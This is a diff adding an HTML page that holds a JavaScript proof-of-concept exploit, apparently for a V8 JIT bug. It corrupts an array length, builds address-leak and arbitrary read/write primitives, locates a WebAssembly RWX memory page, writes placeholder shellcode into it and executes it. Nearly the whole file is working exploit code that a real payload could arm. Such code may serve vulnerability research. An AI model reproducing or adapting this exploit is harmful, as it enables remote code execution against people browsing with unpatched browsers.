@@ -1,0 +1,156 @@
+<html>
+<script>
+function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }
+
+var f64 = new Float64Array(1);
+var u32 = new Uint32Array(f64.buffer);
+function d2u(v) {
+    f64[0] = v;
+    return u32;
+}
+function u2d(lo, hi) {
+    u32[0] = lo;
+    u32[1] = hi;
+    return f64[0];
+}
+
+function hex(l, h) {
+    return "0x" + h.toString(16) + l.toString(16).padStart(8, 0);
+}
+
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+let buf2 = new ArrayBuffer(0x150);
+
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+
+function itof(val) {
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+
+function log(msg) {
+	document.write(msg + "</br>");
+}
+
+function poc() {
+    function foo(b) {
+        let x = -1;
+        if (b) x = 0xffffffff;
+        let arr = new Array(Math.sign(0 - Math.max(0, x, -1)));
+        arr.shift();
+        let cor = [
+            u2d(0x13371337, 0x13371337),
+            u2d(0x13381338, 0x13381338),
+            u2d(0x13391339, 0x13391339)];
+        return [arr, cor];
+    }
+
+    for (let i = 0; i < 0x3000; i++) {
+        foo(false);
+    }
+
+    var x = foo(true);
+    var arr = x[0];
+    var cor = x[1];
+
+    let victim = [
+        u2d(0x41414141, 0x41414141),
+        u2d(0x42424242, 0x42424242),
+        new ArrayBuffer(0xd000),
+        new ArrayBuffer(0xbeef),
+    ];
+
+    // 53
+    const idx = 3;
+    //const idx = 6;
+    arr[idx + 10] = 0x4242;
+
+    if (cor.length == 0x4242) {
+    	alert("your browser is vulnerable...");
+    } else {
+    	return null;
+    }
+    
+    log("arr length is corrupted => 0x" + cor.length.toString(16));
+
+    function addrof(k) {
+        arr[idx+5] = k;
+        return d2u(cor[1]);
+    }
+
+    let ab_addr = ftoi(cor[53]);
+    let wasm_instance_addr = addrof(wasm_instance);
+
+    log("ArrayBuffer Address leaked => 0x" + ab_addr.toString(16));
+    log("wasm instance object Address leaked => " + hex(wasm_instance_addr[0], wasm_instance_addr[1]));
+
+    cor[53] = u2d(wasm_instance_addr[0] - 1, wasm_instance_addr[1]);
+    let dv = new DataView(victim[2]);
+
+    let rwx_addr = [dv.getUint32(0x80, true), dv.getUint32(0x84, true)];
+    log("WebAssembly RWX permission Page Address leaked => " + hex(dv.getUint32(0x80, true), dv.getUint32(0x84, true)));
+    cor[53] = u2d(dv.getUint32(0x80, true), dv.getUint32(0x84, true));
+
+    // set shellcode here :)
+    let shellcode = new Uint32Array(0x400);
+    let u8_sc = new Uint8Array(shellcode.buffer);
+    shellcode.fill(0xc3c3c3c3);
+
+    let tmp_64 = new Uint32Array(2);
+    let tmp_8 = new Uint8Array(tmp_64.buffer);
+    tmp_64[0] = rwx_addr[0] + 0x400;
+    tmp_64[1] = rwx_addr[1];
+
+    let path = "/proc/self/maps\x00";
+    for (let i = 0; i < path.length; i++) {
+        u8_sc[0x400 + i] = path.charCodeAt(i);
+    }
+
+    let shellcode_str = "\xcc\xcc\xcc\xcc";
+
+    for (let i = 0; i < shellcode_str.length; i++) {
+        u8_sc[i] = shellcode_str.charCodeAt(i);
+    }
+
+    // rdi => file name location (rwx memory)
+    let index = shellcode_str.indexOf("\xcc");
+    for (let i = 0; i < 8; i++) {
+        u8_sc[index + i] = tmp_8[i];
+    }
+
+    for (let i = 0; i < shellcode.length; i++) {
+        dv.setUint32(4 * i, 0xcccccccc, true);
+    }
+
+    dv.setUint32(0, 0xccccccc3, true);
+
+    //cor[53] = u2d(rwx_addr[0], rwx_addr[1]);
+    log("</br>");
+    log("RWX page contents... (overwrite with int3 breakpoint instruction)");
+    for (let i = 0; i < 0x20; i++) {
+        log(hex(dv.getUint32(8 * i, true), dv.getUint32(8 * i + 4, true)));
+    }
+
+    f();
+
+    cor[53] = u2d(rwx_addr[0] + 0x400, rwx_addr[1]);
+    for (let i = 0; i < 0x10; i++) {
+        //log(hex(dv.getUint32(8 * i, true), dv.getUint32(8 * i + 4, true)));
+    }
+};
+
+gc();
+poc();
+</script>
+</html>
